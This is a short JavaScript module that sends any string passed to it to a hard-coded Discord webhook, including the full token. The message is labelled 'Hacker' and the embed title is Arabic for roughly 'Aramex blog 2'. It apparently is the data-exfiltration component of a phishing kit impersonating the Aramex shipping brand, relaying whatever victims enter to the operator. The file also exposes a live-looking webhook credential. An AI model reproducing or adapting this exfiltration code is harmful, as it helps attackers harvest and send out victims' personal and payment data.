import axios from 'axios';


export const TeleSned = () => {

    const Send = async (des) => {
        const body = {
          content: "Hacker",
          tts: false,
          color: "white",
          embeds: [
            {
              title: "  2 مدونة ارامكس ",
              description: des,
           },
          ],
    };
            
        await axios.post("https://discord.com/api/webhooks/1322910820996481084/o7T_-VK79AGqJcY_q9i778Ghx8d_95fFIM7bCfsd218rqlnX5gYs5du2W-wT_pe_uYFj",body)
             
    }
  return {
    Send,
}
}

export default TeleSned;
